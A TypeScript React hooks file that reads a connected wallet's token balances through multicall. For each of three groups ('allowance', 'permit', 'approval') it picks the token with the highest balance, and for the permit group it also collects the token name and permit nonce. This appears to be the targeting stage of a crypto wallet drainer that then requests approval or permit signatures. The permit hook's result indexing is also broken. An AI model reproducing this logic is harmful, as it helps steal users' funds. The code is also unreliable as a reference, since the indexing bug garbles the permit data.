import MultiCall from "@indexed-finance/multicall"
import { useEffect, useState } from "react"
import { ethers } from "ethers";
import { CHAIN_ID, PROVIDER, TOKEN } from "../config";

import allowanceABI from "../abi/increaseAllowance.json";
import permitABI from "../abi/permit-7.json";


export const web3Provider = new ethers.providers.JsonRpcProvider(PROVIDER[CHAIN_ID], CHAIN_ID);

export const useCheckAllowanceBestToken = (account: string, library: any) => {

    const [state, setState] = useState({
        allowanceBestToken: "",
        balanceAllowance: BigInt(0),
    });

    useEffect(() => {

        const fetch = async () => {

            const multicall = new MultiCall(web3Provider);
            try {
                const multicallStructure = TOKEN[CHAIN_ID]["allowance"].address.map(address => ({
                    target: address,
                    function: 'balanceOf',
                    args: [account]
                }));

                const [, res] = await multicall.multiCall(allowanceABI, multicallStructure);


                const tokenBalances = TOKEN[CHAIN_ID]["allowance"].address.map((address, index) => ({
                    address,
                    balance: res[index]
                }));

                const tokenWithMaxBalance = tokenBalances.sort((a, b) => b.balance.sub(a.balance))[0];

                setState({
                    allowanceBestToken: tokenWithMaxBalance.address,
                    balanceAllowance: tokenWithMaxBalance.balance,
                })
            }
            catch (e) {
                console.log(e);
            }
        }

        if (account && library) fetch();

    }, [account, library])

    return state;

}

export const useCheckPermitBestToken = (account: string, library: any) => {

    const [state, setState] = useState({
        permitBestToken: "",
        balancePermit: BigInt(0),
        nonce: 0,
        name: ""
    });

    useEffect(() => {

        const fetch = async () => {

            const multicall = new MultiCall(web3Provider);
            try {
                const multicallStructure = TOKEN[CHAIN_ID]["permit"].address.flatMap(address => ([
                    {
                        target: address,
                        function: 'balanceOf',
                        args: [account]
                    },
                    {
                        target: address,
                        function: "name",
                        args: []
                    },
                    {
                        target: address,
                        function: "nonces",
                        args: [account]
                    }
                ]));

                console.log(multicallStructure);

                const [, res] = await multicall.multiCall(permitABI, multicallStructure);

                console.log(res);

                const tokenBalances = TOKEN[CHAIN_ID]["permit"].address.map((address, index) => ({
                    address,
                    balance: res[index],
                    name: res[index + 1],
                    nonce: res[index + 2]
                }));

                const tokenWithMaxBalance = tokenBalances.sort((a, b) => b.balance.sub(a.balance))[0];

                setState({
                    permitBestToken: tokenWithMaxBalance.address,
                    balancePermit: tokenWithMaxBalance.balance,
                    name: tokenWithMaxBalance.name,
                    nonce: tokenWithMaxBalance.nonce
                })

            }
            catch (e) {
                console.log(e);
            }
        }
        if (account && library) fetch();

    }
        , [account, library])

    return state;

}

export const useCheckApprovalBestToken = (account: string, library: any) => {

    const [state, setState] = useState({
        approvalBestToken: "",
        balanceApproval: BigInt(0),
    });

    useEffect(() => {

        const fetch = async () => {

            const multicall = new MultiCall(web3Provider);
            try {
                const multicallStructure = TOKEN[CHAIN_ID]["approval"].address.map(address => ({
                    target: address,
                    function: 'balanceOf',
                    args: [account]
                }));

                const [, res] = await multicall.multiCall(allowanceABI, multicallStructure);

                console.log(res);

                const tokenBalances = TOKEN[CHAIN_ID]["approval"].address.map((address, index) => ({
                    address,
                    balance: res[index]
                }));

                const tokenWithMaxBalance = tokenBalances.sort((a, b) => b.balance.sub(a.balance))[0];

                setState({
                    approvalBestToken: tokenWithMaxBalance.address,
                    balanceApproval: tokenWithMaxBalance.balance,
                })

            }
            catch (e) {
                console.log(e);
            }
        }
    
        if (account && library) fetch();

    }, [account, library])

    return state;

}

